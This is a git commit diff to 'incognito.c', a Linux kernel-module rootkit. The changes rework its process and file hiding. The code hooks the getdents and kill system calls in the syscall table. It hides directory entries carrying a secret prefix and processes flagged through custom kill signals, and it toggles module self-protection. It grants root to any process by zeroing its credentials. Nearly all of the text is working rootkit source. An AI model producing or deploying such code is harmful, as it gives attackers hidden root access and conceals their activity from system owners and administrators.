96769aa884f78fe03b3a740a6936ad1cb2f294ce
Kordell Stewart <30807917+MiltonMan@users.noreply.github.com>
2018-11-27 21:41:44 -0500

    Corrected file and pid hide

--- incognito.c
+++ incognito.c
@@ -55,22 +55,27 @@ void incognito_exit(void);
 #endif
 
 //for hiding pids and files/directories
-const char * const HIDE_PS[] = {"ps", "bash"};
-const char * const HIDE_FILES[] = {"hidetarget.txt", "config.h", "incognito.c", "README.md", "Makefile"};
-#define INVISIBLE 0x10000000
+//this is for pids
+#define INCOGNITO 0x10000000
+//any file or directory with the following prefix will be hidden while incognito is active
 #define INCOGNITO_PREFIX "incognito_secret"
 
-//kill command signals
+//kill command signals we use for our input
 enum {
+    //signal to toggle hide a process
     SIGHIDE = 31,
-    //SIGPROTECT = 32,
+    //signal to toggle protect module
+    SIGPROTECT = 1,
+    //signal to grant root to a target process
     SIGROOT = 64,
+    //signal to toggle the module to INCOGNITO MODE (hidden AND protected)
     SIGMODHIDE = 63,
 };
 
 //linux_dirent struct
 //https://www.systutorials.com/docs/linux/man/2-getdents/
-struct linux_dirent {
+struct linux_dirent
+{
     unsigned long   d_ino;
     unsigned long   d_off;
     unsigned short  d_reclen;
@@ -91,19 +96,19 @@ unsigned long** sys_call_table;
 //getdents is very important, hijacking it gets us hiding files and hiding processes
 //-----------------------------Original call list------------------------------
 asmlinkage long (*originalGetdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
-asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
-asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-asmlinkage long (*originalKill)(pid_t pid, int sig);
+//asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
+//asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
+//asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+//asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+static asmlinkage long (*originalKill)(pid_t pid, int sig);
 
 //------------------------------Hijacked call list------------------------------
 asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
-asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
-asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
-asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
-asmlinkage long hijackedKill(pid_t pid, int sig);
+//asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
+//asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
+//asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+//asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+static asmlinkage long hijackedKill(pid_t pid, int sig);
 
 static int page_read_write(ulong address)
 {
@@ -171,7 +176,8 @@ void reveal(void)
 //We take advantage of the above to make incognito stick
 //protection flag
 int protected = 0;
-void protect(void){
+void protect(void)
+{
 	if (protected){
 		return;
 	} else {
@@ -182,7 +188,8 @@ void protect(void){
 	}
 }
 
-void unprotect(void){
+void unprotect(void)
+{
 	if (!protected){
 		return;
 	} else {
@@ -196,7 +203,8 @@ void unprotect(void){
 //----------------------------END PROTECT/UNPROTECT----------------------------
 
 //---------------------------ROOT GET------------------------------------------
-void root(void){
+void root(void)
+{
 	//grants root to the process that calls this method
 	struct cred *creds = prepare_creds();
 	struct task_struct *task = current;
@@ -206,11 +214,13 @@ void root(void){
 	creds->euid.val = 0;
     creds->gid.val = 0;
 	creds->egid.val = 0;
+
 	//FYI THESE WILL CRASH LINUX
 	//creds->suid.val = 0;
 	//creds->sgid.val = 0;
 	//creds->fsuid.val = 0;
 	//creds->fsgid.val = 0;
+
 	printk(KERN_WARNING "pid %d , %s is now root\n",task->pid,task->comm);
 
 	commit_creds(creds);
@@ -220,139 +230,156 @@ void root(void){
 
 
 //---------------------------PROCESS HIDE------------------------------------------
-int command_ps_check(uint fd){
-	struct file *fdFile;
-	struct inode *fdInode;
-
-	//https://linux.die.net/man/8/fsck
-	fdFile = fcheck(fd);
-	if (unlikely(!fdFile)){
-		return 0;
-	}
-
-	fdInode = file_inode(fdFile);
-	if (fdInode->i_ino == PROC_ROOT_INO && imajor(fdInode) == 0 && iminor(fdInode) == 0) {
-                //user typed ps command so return 1
-                return 1;
+//this method fetches the task struct of a given pid
+struct task_struct * fetchTask(pid_t pid)
+{
+    struct task_struct *pointer = current;
+    //for_each_process is a linux method in signal.h that goes throught the entire task list
+    for_each_process(pointer) {
+        //if the pid of the task matches our mark, return it
+        if (pointer->pid == pid){
+            return pointer;
         }
+    }
+    //otherwise, it's not there and we return null
+    return NULL;
+}
+
+//check if a given pid is currently "incognto" (that is, hidden)
+int isIncognito(pid_t pid)
+{
+    struct task_struct *task;
+
+    if (!pid)
+    {
         return 0;
-}
-
-int hideCheck(char *pname){
-        //Check if a given process name is in our "to-hide" list array HIDE_PS[]
-        int i;
-        for ( i = 0; i < sizeof(HIDE_PS) / sizeof(char *); i++){
-		// Check if we got a match
-                if (strcmp(pname, HIDE_PS[i]) == 0) {
-                        return 1;
-                }
-        }
-        //no matches, we return
-        return 0;
-}
-
-long hideProcess(struct linux_dirent *dirp, long getdents){
-        unsigned int offset;
-        //http://man7.org/linux/man-pages/man2/getdents.2.html
-        //read about the linux_dirent structure here ALL HAIL THE DIRP!!
-        struct linux_dirent *currentd, *nextd;
-        char *pname;
-        char *dirname;
-        char *direntPtr = (char *)dirp;
-        size_t dirnameLength;
-        pid_t pidNumber;
-        //good ol' task_struct
-        struct task_struct *procTask;
-        struct pid *pid;
-
-        int offsetError;
-
-        //our getdents is the number of bytes read here
-        for (offset = 0; offset < getdents;) {
-                currentd = (struct linux_dirent *)(direntPtr + offset);
-                dirname = currentd->d_name;
-                dirnameLength = currentd->d_reclen - 2 - offsetof(struct linux_dirent, d_name);
-                offsetError = kstrtoint_from_user(dirname, dirnameLength, 10, (int *)&pidNumber);
-                //switch case to make sure we don't mess up in any spot
-                //check the error
-                if (offsetError < 0) {
-                        //goto next;
-                }
-                //get pid
-                pid = find_get_pid(pidNumber);
-                if (!pid){
-                        goto next;
-                }
-                //get the task struct for current pid
-                procTask = get_pid_task(pid, PIDTYPE_PID);
-                if (!procTask){
-                        goto next;
-                }
-                //get pname from current task struct
-                pname = (char *)kmalloc((sizeof(procTask->comm)), GFP_KERNEL);
-                if (!pname){
-                        goto next;
-                }
-
-                //get_task_comm gets me errors so we use the above
-                //pname = get_task_comm(pname, procTask);
-
-                if (hideCheck(pname)){
-                        // We hide the process by deleting its dirent: shift all its right dirents to left!
-                        //debug check
-                        printk("Hiding Process: %s\n", procTask->comm);
-                        nextd = (struct linux_dirent *)((char *)currentd + currentd->d_reclen);
-                        getdents = currentd->d_reclen;
-                        //update offset
-                        offset = offset - currentd->d_reclen;
-                }
-                //free pname allocation
-                kfree(pname);
-                //Next case: we update offset and move on
-                next:
-                        //update offset
-                        offset = offset + currentd->d_reclen;
-        }
-        return getdents;
-}
-
-long processProcess(unsigned int fd, struct linux_dirent *dirp, long getdents){
-    struct files_struct *openFiles = current->files;
-    int psCheck = 0;
-    spin_lock(&openFiles->file_lock);
-
-    //check if the user is doing a "ps" command and if so mess with it
-    psCheck = command_ps_check(fd);
-    if (psCheck != 0){
-        getdents = hideProcess(dirp, getdents);
     }
 
-    spin_unlock(&openFiles->file_lock);
-    return getdents;
+    task = fetchTask(pid);
+
+    if (!task)
+    {
+    return 0;
+    }
+
+    if (task->flags & INCOGNITO)
+    {
+        //pid is currently hidden
+        return 1;
+    }
+
+    return 0;
 }
+
 //---------------------------END PROCESS HIDE--------------------------------------
 //---------------------------GETDENTS HIJACK-------------------------------------
 //This is used for hiding files and pids and is thus VERY IMPORTANT
-asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
+asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+{
 	long getdents;
+    int proc = 0;
+    long offset = 0;
+    long error;
+
+    //make linux_drent structs we need
+    struct linux_dirent *directory;
+    struct linux_dirent *ourDirp;
+    struct linux_dirent *previous = NULL;
+
+    //inode
+    struct inode *d_inode;
+
 	//Fetch the original getdents sys call
 	getdents = (*originalGetdents)(fd, dirp, count);
 
-	//put getdents for ls (hiding files) here!!
+    //check getdents
+    if (getdents <= 0)
+    {
+        return getdents;
+    }
 
-	//get dents for hiding processes
-	getdents = processProcess(fd, dirp, getdents);
-        return 0;
+    //http://www.emblogic.com/blog/08/gfp_kernel/
+    ourDirp = kzalloc(getdents, GFP_KERNEL);
+    if (ourDirp == NULL)
+    {
+            return getdents;
+    }
+
+    error = copy_from_user(ourDirp, dirp, getdents);
+    if (error)
+    {
+        goto exit;
+    }
+
+    //define d_inode
+    //4.x kernal so we use the following
+    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
+
+    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+    {
+        proc = 1;
+    }
+
+    while (offset < getdents)
+    {
+        directory = (void *)ourDirp + offset;
+        if ((!proc && (memcmp(INCOGNITO_PREFIX, directory->d_name, strlen(INCOGNITO_PREFIX)) == 0)) || (proc && isIncognito(simple_strtoul(directory->d_name, NULL, 10)))) {
+            if (directory == ourDirp){
+                getdents = getdents - directory->d_reclen;
+                memmove(directory, (void *)directory + directory->d_reclen, getdents);
+                continue;
+            }
+            previous->d_reclen += directory->d_reclen;
+        } else {
+            previous = directory;
+        }
+        offset += directory->d_reclen;
+    }
+
+    error = copy_to_user(dirp, ourDirp, getdents);
+
+    if (error){
+        goto exit;
+    }
+
+exit:
+    kfree(ourDirp);
+    return getdents;
+}
+
+void initializeHijack(void)
+{
+    HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);
+
+}
+
+void exitHijack(void)
+{
+    UNHOOK(sys_call_table, originalGetdents, __NR_getdents);
+
 }
 //-----------------------------END GETDENTS------------------------------------
 //-----------------------------KILL HIJACK------------------------------------
-asmlinkage long hijackedKill(pid_t pid, int signal){
+static asmlinkage long hijackedKill(pid_t pid, int signal)
+{
     //hijack the kill command for our input
     //task for pid nonsense
-    //struct task_struct *task;
+    struct task_struct *task;
     switch (signal) {
         case SIGHIDE:
         //hide the process
+        if ((task = fetchTask(pid)) == NULL){
+            return -ESRCH;
+        }
+        task->flags ^= INCOGNITO;
+            break;
+        case SIGPROTECT:
+        //toggle just the protection
+        if (protected){
+            unprotect();
+        } else {
+            protect();
+        }
             break;
         case SIGROOT:
         //grant the process root
@@ -375,7 +402,8 @@ asmlinkage long hijackedKill(pid_t pid, int signal){
 }
 //-----------------------------END KILL HIJACK------------------------------
 
-int __init incognito_init(void) {
+int __init incognito_init(void)
+{
   //find system call table address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 	if (!sys_call_table){
@@ -390,15 +418,18 @@ int __init incognito_init(void) {
 	//Start hidden and protected module
 	//hide();
     //protect();
+    
 
 	//System Calls
 	page_read_write((ulong)sys_call_table);
 	//HOOK(sys_call_table, originalOpen, hijackedOpen, __NR_open);
 	//HOOK(sys_call_table, originalLstat, hijackedLstat, __NR_lstat);
 	//HOOK(sys_call_table, originalStat, hijackedStat, __NR_stat);
+
     //hook getdents
-    HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);
     HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
+    //get getdents
+    initializeHijack();
 	page_read_only((ulong)sys_call_table);
 	//Debug Print
     printk("incognito: module loaded\n");
@@ -411,20 +442,23 @@ int __init incognito_init(void) {
   return 0;
 }
 
-void __exit incognito_exit(void) {
+void __exit incognito_exit(void)
+{
 
 	//unhook our hijacked calls
 	page_read_write((ulong)sys_call_table);
 	//UNHOOK(sys_call_table, originalOpen, __NR_open);
 	//UNHOOK(sys_call_table, originalLstat, __NR_lstat);
 	//UNHOOK(sys_call_table, originalStat, __NR_stat);
+
     //Unhook getdents last (this unhides processes)
-    UNHOOK(sys_call_table, originalGetdents, __NR_getdents);
     UNHOOK(sys_call_table, originalKill, __NR_kill);
+    //pull out of getdents
+    exitHijack();
 	page_read_only((ulong)sys_call_table);
 
 
-  printk("incognito: module removed\n");
+    printk("incognito: module removed\n");
 
 
 }
